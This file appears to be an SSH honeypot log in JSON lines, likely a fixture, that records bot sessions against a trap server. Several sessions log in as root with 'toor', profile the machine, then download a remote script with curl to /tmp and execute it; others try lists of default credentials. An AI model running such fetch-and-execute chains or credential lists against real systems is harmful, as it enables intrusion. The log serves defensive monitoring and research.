+{"event": "command", "ts": "2026-10-21T06:22:43.743438+00:00", "session_id": "4ff0c38d", "src_ip": "203.0.113.44", "command": "free -m", "seconds_since_prev": 0.1642, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T06:22:43.910119+00:00", "session_id": "4ff0c38d", "src_ip": "203.0.113.44", "command": "cat /proc/cpuinfo | grep 'model name' | head -1", "seconds_since_prev": 0.1667, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T06:22:44.208704+00:00", "session_id": "4ff0c38d", "src_ip": "203.0.113.44", "command": "curl -s http://203.0.113.199/setup.sh -o /tmp/s.sh", "seconds_since_prev": 0.2986, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T06:22:44.430195+00:00", "session_id": "4ff0c38d", "src_ip": "203.0.113.44", "command": "chmod +x /tmp/s.sh", "seconds_since_prev": 0.2215, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T06:22:44.737829+00:00", "session_id": "4ff0c38d", "src_ip": "203.0.113.44", "command": "/tmp/s.sh", "seconds_since_prev": 0.3076, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T06:22:44.893328+00:00", "session_id": "4ff0c38d", "src_ip": "203.0.113.44", "command": "crontab -l", "seconds_since_prev": 0.1555, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-21T06:22:45.434918+00:00", "session_id": "4ff0c38d", "src_ip": "203.0.113.44", "duration_s": 2.951, "command_count": 8, "auth_attempts": 2, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T17:54:42.483536+00:00", "session_id": "37b33e85", "src_ip": "203.0.113.44", "src_port": 37239, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "auth_attempt", "ts": "2026-10-17T17:54:42.840482+00:00", "session_id": "37b33e85", "src_ip": "203.0.113.44", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T17:54:42.991465+00:00", "session_id": "37b33e85", "src_ip": "203.0.113.44", "username": "root", "password": "toor", "accepted": true}
+{"event": "command", "ts": "2026-10-17T17:54:43.270948+00:00", "session_id": "37b33e85", "src_ip": "203.0.113.44", "command": "uname -a", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:54:43.477695+00:00", "session_id": "37b33e85", "src_ip": "203.0.113.44", "command": "nproc", "seconds_since_prev": 0.2067, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:54:43.689510+00:00", "session_id": "37b33e85", "src_ip": "203.0.113.44", "command": "free -m", "seconds_since_prev": 0.2118, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:54:43.869814+00:00", "session_id": "37b33e85", "src_ip": "203.0.113.44", "command": "cat /proc/cpuinfo | grep 'model name' | head -1", "seconds_since_prev": 0.1803, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:54:44.047328+00:00", "session_id": "37b33e85", "src_ip": "203.0.113.44", "command": "curl -s http://203.0.113.199/setup.sh -o /tmp/s.sh", "seconds_since_prev": 0.1775, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:54:44.209360+00:00", "session_id": "37b33e85", "src_ip": "203.0.113.44", "command": "chmod +x /tmp/s.sh", "seconds_since_prev": 0.162, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:54:44.353614+00:00", "session_id": "37b33e85", "src_ip": "203.0.113.44", "command": "/tmp/s.sh", "seconds_since_prev": 0.1443, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:54:44.530850+00:00", "session_id": "37b33e85", "src_ip": "203.0.113.44", "command": "crontab -l", "seconds_since_prev": 0.1772, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T17:54:45.014952+00:00", "session_id": "37b33e85", "src_ip": "203.0.113.44", "duration_s": 2.531, "command_count": 8, "auth_attempts": 2, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-16T04:30:42.483536+00:00", "session_id": "a1fc05c6", "src_ip": "203.0.113.44", "src_port": 55073, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "auth_attempt", "ts": "2026-10-16T04:30:42.654548+00:00", "session_id": "a1fc05c6", "src_ip": "203.0.113.44", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T04:30:42.926362+00:00", "session_id": "a1fc05c6", "src_ip": "203.0.113.44", "username": "root", "password": "toor", "accepted": true}
+{"event": "command", "ts": "2026-10-16T04:30:43.140727+00:00", "session_id": "a1fc05c6", "src_ip": "203.0.113.44", "command": "uname -a", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T04:30:43.397408+00:00", "session_id": "a1fc05c6", "src_ip": "203.0.113.44", "command": "nproc", "seconds_since_prev": 0.2567, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T04:30:43.536420+00:00", "session_id": "a1fc05c6", "src_ip": "203.0.113.44", "command": "free -m", "seconds_since_prev": 0.139, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T04:30:43.721516+00:00", "session_id": "a1fc05c6", "src_ip": "203.0.113.44", "command": "cat /proc/cpuinfo | grep 'model name' | head -1", "seconds_since_prev": 0.1851, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T04:30:43.906925+00:00", "session_id": "a1fc05c6", "src_ip": "203.0.113.44", "command": "curl -s http://203.0.113.199/setup.sh -o /tmp/s.sh", "seconds_since_prev": 0.1854, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T04:30:44.069231+00:00", "session_id": "a1fc05c6", "src_ip": "203.0.113.44", "command": "chmod +x /tmp/s.sh", "seconds_since_prev": 0.1623, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T04:30:44.268536+00:00", "session_id": "a1fc05c6", "src_ip": "203.0.113.44", "command": "/tmp/s.sh", "seconds_since_prev": 0.1993, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T04:30:44.562161+00:00", "session_id": "a1fc05c6", "src_ip": "203.0.113.44", "command": "crontab -l", "seconds_since_prev": 0.2936, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-16T04:30:45.447668+00:00", "session_id": "a1fc05c6", "src_ip": "203.0.113.44", "duration_s": 2.964, "command_count": 8, "auth_attempts": 2, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-20T17:14:42.483536+00:00", "session_id": "6849224d", "src_ip": "203.0.113.8", "src_port": 43903, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "auth_attempt", "ts": "2026-10-20T17:14:42.700182+00:00", "session_id": "6849224d", "src_ip": "203.0.113.8", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T17:14:43.020591+00:00", "session_id": "6849224d", "src_ip": "203.0.113.8", "username": "root", "password": "toor", "accepted": true}
+{"event": "command", "ts": "2026-10-20T17:14:43.323913+00:00", "session_id": "6849224d", "src_ip": "203.0.113.8", "command": "uname -a", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:14:43.614753+00:00", "session_id": "6849224d", "src_ip": "203.0.113.8", "command": "nproc", "seconds_since_prev": 0.2908, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:14:43.866113+00:00", "session_id": "6849224d", "src_ip": "203.0.113.8", "command": "free -m", "seconds_since_prev": 0.2514, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:14:44.071931+00:00", "session_id": "6849224d", "src_ip": "203.0.113.8", "command": "cat /proc/cpuinfo | grep 'model name' | head -1", "seconds_since_prev": 0.2058, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:14:44.253551+00:00", "session_id": "6849224d", "src_ip": "203.0.113.8", "command": "curl -s http://203.0.113.199/setup.sh -o /tmp/s.sh", "seconds_since_prev": 0.1816, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:14:44.434994+00:00", "session_id": "6849224d", "src_ip": "203.0.113.8", "command": "chmod +x /tmp/s.sh", "seconds_since_prev": 0.1814, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:14:44.609246+00:00", "session_id": "6849224d", "src_ip": "203.0.113.8", "command": "/tmp/s.sh", "seconds_since_prev": 0.1743, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:14:44.833456+00:00", "session_id": "6849224d", "src_ip": "203.0.113.8", "command": "crontab -l", "seconds_since_prev": 0.2242, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-20T17:14:45.221348+00:00", "session_id": "6849224d", "src_ip": "203.0.113.8", "duration_s": 2.738, "command_count": 8, "auth_attempts": 2, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T09:59:42.483536+00:00", "session_id": "ba0d449f", "src_ip": "203.0.113.8", "src_port": 30099, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "auth_attempt", "ts": "2026-10-17T09:59:42.578743+00:00", "session_id": "ba0d449f", "src_ip": "203.0.113.8", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T09:59:42.752869+00:00", "session_id": "ba0d449f", "src_ip": "203.0.113.8", "username": "root", "password": "toor", "accepted": true}
+{"event": "command", "ts": "2026-10-17T09:59:42.984020+00:00", "session_id": "ba0d449f", "src_ip": "203.0.113.8", "command": "uname -a", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T09:59:43.155456+00:00", "session_id": "ba0d449f", "src_ip": "203.0.113.8", "command": "nproc", "seconds_since_prev": 0.1714, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T09:59:43.342281+00:00", "session_id": "ba0d449f", "src_ip": "203.0.113.8", "command": "free -m", "seconds_since_prev": 0.1868, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T09:59:43.511982+00:00", "session_id": "ba0d449f", "src_ip": "203.0.113.8", "command": "cat /proc/cpuinfo | grep 'model name' | head -1", "seconds_since_prev": 0.1697, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T09:59:43.802042+00:00", "session_id": "ba0d449f", "src_ip": "203.0.113.8", "command": "curl -s http://203.0.113.199/setup.sh -o /tmp/s.sh", "seconds_since_prev": 0.2901, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T09:59:44.078503+00:00", "session_id": "ba0d449f", "src_ip": "203.0.113.8", "command": "chmod +x /tmp/s.sh", "seconds_since_prev": 0.2765, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T09:59:44.225655+00:00", "session_id": "ba0d449f", "src_ip": "203.0.113.8", "command": "/tmp/s.sh", "seconds_since_prev": 0.1472, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T09:59:44.379063+00:00", "session_id": "ba0d449f", "src_ip": "203.0.113.8", "command": "crontab -l", "seconds_since_prev": 0.1534, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T09:59:44.714368+00:00", "session_id": "ba0d449f", "src_ip": "203.0.113.8", "duration_s": 2.231, "command_count": 8, "auth_attempts": 2, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T03:43:42.483536+00:00", "session_id": "99aa2b0f", "src_ip": "203.0.113.44", "src_port": 31287, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "auth_attempt", "ts": "2026-10-17T03:43:42.791882+00:00", "session_id": "99aa2b0f", "src_ip": "203.0.113.44", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T03:43:42.872054+00:00", "session_id": "99aa2b0f", "src_ip": "203.0.113.44", "username": "root", "password": "toor", "accepted": true}
+{"event": "command", "ts": "2026-10-17T03:43:43.086906+00:00", "session_id": "99aa2b0f", "src_ip": "203.0.113.44", "command": "uname -a", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T03:43:43.253606+00:00", "session_id": "99aa2b0f", "src_ip": "203.0.113.44", "command": "nproc", "seconds_since_prev": 0.1667, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T03:43:43.478273+00:00", "session_id": "99aa2b0f", "src_ip": "203.0.113.44", "command": "free -m", "seconds_since_prev": 0.2247, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T03:43:43.704617+00:00", "session_id": "99aa2b0f", "src_ip": "203.0.113.44", "command": "cat /proc/cpuinfo | grep 'model name' | head -1", "seconds_since_prev": 0.2263, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T03:43:43.957001+00:00", "session_id": "99aa2b0f", "src_ip": "203.0.113.44", "command": "curl -s http://203.0.113.199/setup.sh -o /tmp/s.sh", "seconds_since_prev": 0.2524, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T03:43:44.121170+00:00", "session_id": "99aa2b0f", "src_ip": "203.0.113.44", "command": "chmod +x /tmp/s.sh", "seconds_since_prev": 0.1642, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T03:43:44.302236+00:00", "session_id": "99aa2b0f", "src_ip": "203.0.113.44", "command": "/tmp/s.sh", "seconds_since_prev": 0.1811, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T03:43:44.436405+00:00", "session_id": "99aa2b0f", "src_ip": "203.0.113.44", "command": "crontab -l", "seconds_since_prev": 0.1342, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T03:43:45.327818+00:00", "session_id": "99aa2b0f", "src_ip": "203.0.113.44", "duration_s": 2.844, "command_count": 8, "auth_attempts": 2, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T00:43:42.483536+00:00", "session_id": "167e68ab", "src_ip": "203.0.113.8", "src_port": 64931, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "auth_attempt", "ts": "2026-10-17T00:43:42.567408+00:00", "session_id": "167e68ab", "src_ip": "203.0.113.8", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T00:43:42.761117+00:00", "session_id": "167e68ab", "src_ip": "203.0.113.8", "username": "root", "password": "toor", "accepted": true}
+{"event": "command", "ts": "2026-10-17T00:43:43.006089+00:00", "session_id": "167e68ab", "src_ip": "203.0.113.8", "command": "uname -a", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T00:43:43.142943+00:00", "session_id": "167e68ab", "src_ip": "203.0.113.8", "command": "nproc", "seconds_since_prev": 0.1369, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T00:43:43.451140+00:00", "session_id": "167e68ab", "src_ip": "203.0.113.8", "command": "free -m", "seconds_since_prev": 0.3082, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T00:43:43.631654+00:00", "session_id": "167e68ab", "src_ip": "203.0.113.8", "command": "cat /proc/cpuinfo | grep 'model name' | head -1", "seconds_since_prev": 0.1805, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T00:43:43.758352+00:00", "session_id": "167e68ab", "src_ip": "203.0.113.8", "command": "curl -s http://203.0.113.199/setup.sh -o /tmp/s.sh", "seconds_since_prev": 0.1267, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T00:43:43.924801+00:00", "session_id": "167e68ab", "src_ip": "203.0.113.8", "command": "chmod +x /tmp/s.sh", "seconds_since_prev": 0.1664, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T00:43:44.185263+00:00", "session_id": "167e68ab", "src_ip": "203.0.113.8", "command": "/tmp/s.sh", "seconds_since_prev": 0.2605, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T00:43:44.345723+00:00", "session_id": "167e68ab", "src_ip": "203.0.113.8", "command": "crontab -l", "seconds_since_prev": 0.1605, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T00:43:45.271293+00:00", "session_id": "167e68ab", "src_ip": "203.0.113.8", "duration_s": 2.788, "command_count": 8, "auth_attempts": 2, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-21T11:33:42.483536+00:00", "session_id": "6573df9c", "src_ip": "203.0.113.8", "src_port": 45957, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "auth_attempt", "ts": "2026-10-21T11:33:42.729229+00:00", "session_id": "6573df9c", "src_ip": "203.0.113.8", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-21T11:33:43.116417+00:00", "session_id": "6573df9c", "src_ip": "203.0.113.8", "username": "root", "password": "toor", "accepted": true}
+{"event": "command", "ts": "2026-10-21T11:33:43.278907+00:00", "session_id": "6573df9c", "src_ip": "203.0.113.8", "command": "uname -a", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T11:33:43.458820+00:00", "session_id": "6573df9c", "src_ip": "203.0.113.8", "command": "nproc", "seconds_since_prev": 0.1799, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T11:33:43.647999+00:00", "session_id": "6573df9c", "src_ip": "203.0.113.8", "command": "free -m", "seconds_since_prev": 0.1892, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T11:33:43.813177+00:00", "session_id": "6573df9c", "src_ip": "203.0.113.8", "command": "cat /proc/cpuinfo | grep 'model name' | head -1", "seconds_since_prev": 0.1652, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T11:33:44.054563+00:00", "session_id": "6573df9c", "src_ip": "203.0.113.8", "command": "curl -s http://203.0.113.199/setup.sh -o /tmp/s.sh", "seconds_since_prev": 0.2414, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T11:33:44.264985+00:00", "session_id": "6573df9c", "src_ip": "203.0.113.8", "command": "chmod +x /tmp/s.sh", "seconds_since_prev": 0.2104, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T11:33:44.538754+00:00", "session_id": "6573df9c", "src_ip": "203.0.113.8", "command": "/tmp/s.sh", "seconds_since_prev": 0.2738, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T11:33:44.822176+00:00", "session_id": "6573df9c", "src_ip": "203.0.113.8", "command": "crontab -l", "seconds_since_prev": 0.2834, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-21T11:33:45.674121+00:00", "session_id": "6573df9c", "src_ip": "203.0.113.8", "duration_s": 3.191, "command_count": 8, "auth_attempts": 2, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-19T12:37:42.483536+00:00", "session_id": "a4debc70", "src_ip": "203.0.113.8", "src_port": 31672, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "auth_attempt", "ts": "2026-10-19T12:37:42.712622+00:00", "session_id": "a4debc70", "src_ip": "203.0.113.8", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T12:37:42.801878+00:00", "session_id": "a4debc70", "src_ip": "203.0.113.8", "username": "root", "password": "toor", "accepted": true}
+{"event": "command", "ts": "2026-10-19T12:37:43.041338+00:00", "session_id": "a4debc70", "src_ip": "203.0.113.8", "command": "uname -a", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T12:37:43.327382+00:00", "session_id": "a4debc70", "src_ip": "203.0.113.8", "command": "nproc", "seconds_since_prev": 0.286, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T12:37:43.516779+00:00", "session_id": "a4debc70", "src_ip": "203.0.113.8", "command": "free -m", "seconds_since_prev": 0.1894, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T12:37:43.668142+00:00", "session_id": "a4debc70", "src_ip": "203.0.113.8", "command": "cat /proc/cpuinfo | grep 'model name' | head -1", "seconds_since_prev": 0.1514, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T12:37:43.873449+00:00", "session_id": "a4debc70", "src_ip": "203.0.113.8", "command": "curl -s http://203.0.113.199/setup.sh -o /tmp/s.sh", "seconds_since_prev": 0.2053, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T12:37:44.080084+00:00", "session_id": "a4debc70", "src_ip": "203.0.113.8", "command": "chmod +x /tmp/s.sh", "seconds_since_prev": 0.2066, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T12:37:44.334690+00:00", "session_id": "a4debc70", "src_ip": "203.0.113.8", "command": "/tmp/s.sh", "seconds_since_prev": 0.2546, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T12:37:44.456484+00:00", "session_id": "a4debc70", "src_ip": "203.0.113.8", "command": "crontab -l", "seconds_since_prev": 0.1218, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-19T12:37:44.558382+00:00", "session_id": "a4debc70", "src_ip": "203.0.113.8", "duration_s": 2.075, "command_count": 8, "auth_attempts": 2, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-22T00:23:42.483536+00:00", "session_id": "5fe6660f", "src_ip": "198.51.100.77", "src_port": 58660, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-22T00:23:42.625478+00:00", "session_id": "5fe6660f", "src_ip": "198.51.100.77", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-22T00:23:42.848956+00:00", "session_id": "5fe6660f", "src_ip": "198.51.100.77", "username": "pi", "password": "raspberry", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-22T00:23:42.909003+00:00", "session_id": "5fe6660f", "src_ip": "198.51.100.77", "username": "ubuntu", "password": "ubuntu", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-22T00:23:43.260188+00:00", "session_id": "5fe6660f", "src_ip": "198.51.100.77", "username": "test", "password": "test", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-22T00:23:43.611509+00:00", "session_id": "5fe6660f", "src_ip": "198.51.100.77", "username": "oracle", "password": "oracle", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-22T00:23:43.981094+00:00", "session_id": "5fe6660f", "src_ip": "198.51.100.77", "username": "ftpuser", "password": "ftpuser", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-22T00:23:44.279429+00:00", "session_id": "5fe6660f", "src_ip": "198.51.100.77", "username": "admin", "password": "admin", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-22T00:23:44.607582+00:00", "session_id": "5fe6660f", "src_ip": "198.51.100.77", "username": "deploy", "password": "deploy123", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-22T00:23:44.662840+00:00", "session_id": "5fe6660f", "src_ip": "198.51.100.77", "username": "postgres", "password": "postgres", "accepted": true}
+{"event": "session_end", "ts": "2026-10-22T00:23:45.101133+00:00", "session_id": "5fe6660f", "src_ip": "198.51.100.77", "duration_s": 2.618, "command_count": 0, "auth_attempts": 9, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-17T12:19:42.483536+00:00", "session_id": "48a1069c", "src_ip": "192.0.2.200", "src_port": 50505, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-17T12:19:42.702526+00:00", "session_id": "48a1069c", "src_ip": "192.0.2.200", "username": "ubuntu", "password": "ubuntu", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T12:19:43.082238+00:00", "session_id": "48a1069c", "src_ip": "192.0.2.200", "username": "jenkins", "password": "jenkins", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T12:19:43.364558+00:00", "session_id": "48a1069c", "src_ip": "192.0.2.200", "username": "test", "password": "test", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T12:19:43.715156+00:00", "session_id": "48a1069c", "src_ip": "192.0.2.200", "username": "oracle", "password": "oracle", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T12:19:43.930548+00:00", "session_id": "48a1069c", "src_ip": "192.0.2.200", "username": "pi", "password": "raspberry", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T12:19:44.194737+00:00", "session_id": "48a1069c", "src_ip": "192.0.2.200", "username": "admin", "password": "admin", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T12:19:44.384890+00:00", "session_id": "48a1069c", "src_ip": "192.0.2.200", "username": "user", "password": "password", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T12:19:44.699666+00:00", "session_id": "48a1069c", "src_ip": "192.0.2.200", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T12:19:44.997641+00:00", "session_id": "48a1069c", "src_ip": "192.0.2.200", "username": "ftpuser", "password": "ftpuser", "accepted": true}
+{"event": "session_end", "ts": "2026-10-17T12:19:45.330105+00:00", "session_id": "48a1069c", "src_ip": "192.0.2.200", "duration_s": 2.847, "command_count": 0, "auth_attempts": 9, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-18T10:13:42.483536+00:00", "session_id": "e7d8a042", "src_ip": "198.51.100.5", "src_port": 32350, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-18T10:13:42.774694+00:00", "session_id": "e7d8a042", "src_ip": "198.51.100.5", "username": "pi", "password": "raspberry", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T10:13:42.865448+00:00", "session_id": "e7d8a042", "src_ip": "198.51.100.5", "username": "oracle", "password": "oracle", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T10:13:43.135135+00:00", "session_id": "e7d8a042", "src_ip": "198.51.100.5", "username": "jenkins", "password": "jenkins", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T10:13:43.504890+00:00", "session_id": "e7d8a042", "src_ip": "198.51.100.5", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T10:13:43.645641+00:00", "session_id": "e7d8a042", "src_ip": "198.51.100.5", "username": "git", "password": "git", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T10:13:43.785854+00:00", "session_id": "e7d8a042", "src_ip": "198.51.100.5", "username": "admin", "password": "admin", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T10:13:43.898551+00:00", "session_id": "e7d8a042", "src_ip": "198.51.100.5", "username": "deploy", "password": "deploy123", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T10:13:44.190673+00:00", "session_id": "e7d8a042", "src_ip": "198.51.100.5", "username": "ftpuser", "password": "ftpuser", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T10:13:44.490559+00:00", "session_id": "e7d8a042", "src_ip": "198.51.100.5", "username": "postgres", "password": "postgres", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T10:13:44.833120+00:00", "session_id": "e7d8a042", "src_ip": "198.51.100.5", "username": "ubuntu", "password": "ubuntu", "accepted": true}
+{"event": "session_end", "ts": "2026-10-18T10:13:45.114558+00:00", "session_id": "e7d8a042", "src_ip": "198.51.100.5", "duration_s": 2.631, "command_count": 0, "auth_attempts": 10, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-20T06:01:42.483536+00:00", "session_id": "34592575", "src_ip": "198.51.100.5", "src_port": 56440, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-20T06:01:42.558550+00:00", "session_id": "34592575", "src_ip": "198.51.100.5", "username": "admin", "password": "admin", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T06:01:42.737132+00:00", "session_id": "34592575", "src_ip": "198.51.100.5", "username": "ftpuser", "password": "ftpuser", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T06:01:42.788941+00:00", "session_id": "34592575", "src_ip": "198.51.100.5", "username": "git", "password": "git", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T06:01:43.152213+00:00", "session_id": "34592575", "src_ip": "198.51.100.5", "username": "pi", "password": "raspberry", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T06:01:43.222920+00:00", "session_id": "34592575", "src_ip": "198.51.100.5", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T06:01:43.477492+00:00", "session_id": "34592575", "src_ip": "198.51.100.5", "username": "oracle", "password": "oracle", "accepted": true}
+{"event": "session_end", "ts": "2026-10-20T06:01:43.926801+00:00", "session_id": "34592575", "src_ip": "198.51.100.5", "duration_s": 1.443, "command_count": 0, "auth_attempts": 6, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-17T10:36:42.483536+00:00", "session_id": "3ae0b818", "src_ip": "198.51.100.77", "src_port": 51047, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-17T10:36:42.689133+00:00", "session_id": "3ae0b818", "src_ip": "198.51.100.77", "username": "oracle", "password": "oracle", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T10:36:42.818328+00:00", "session_id": "3ae0b818", "src_ip": "198.51.100.77", "username": "user", "password": "password", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T10:36:43.212258+00:00", "session_id": "3ae0b818", "src_ip": "198.51.100.77", "username": "ftpuser", "password": "ftpuser", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T10:36:43.453514+00:00", "session_id": "3ae0b818", "src_ip": "198.51.100.77", "username": "postgres", "password": "postgres", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T10:36:43.544864+00:00", "session_id": "3ae0b818", "src_ip": "198.51.100.77", "username": "test", "password": "test", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T10:36:43.606349+00:00", "session_id": "3ae0b818", "src_ip": "198.51.100.77", "username": "pi", "password": "raspberry", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T10:36:43.914689+00:00", "session_id": "3ae0b818", "src_ip": "198.51.100.77", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T10:36:44.012718+00:00", "session_id": "3ae0b818", "src_ip": "198.51.100.77", "username": "admin", "password": "admin", "accepted": false}
